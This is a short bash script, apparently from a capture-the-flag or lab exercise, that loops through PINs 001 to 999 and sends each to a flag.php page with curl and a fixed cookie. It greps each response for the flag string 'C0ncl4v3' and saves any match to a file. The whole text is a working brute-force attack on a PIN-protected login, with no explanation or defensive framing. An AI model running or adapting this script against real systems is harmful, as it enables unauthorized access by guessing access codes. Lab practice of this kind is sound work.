for i in $(seq -w 1 999); do
    echo "Iteración: $i"
    curl -X GET "http://baymax.tlm.unavarra.es:42128/flag.php?pin=${i}&enter=" -b "cookie1=value1" | grep "C0ncl4v3" >> respuesta.txt
done
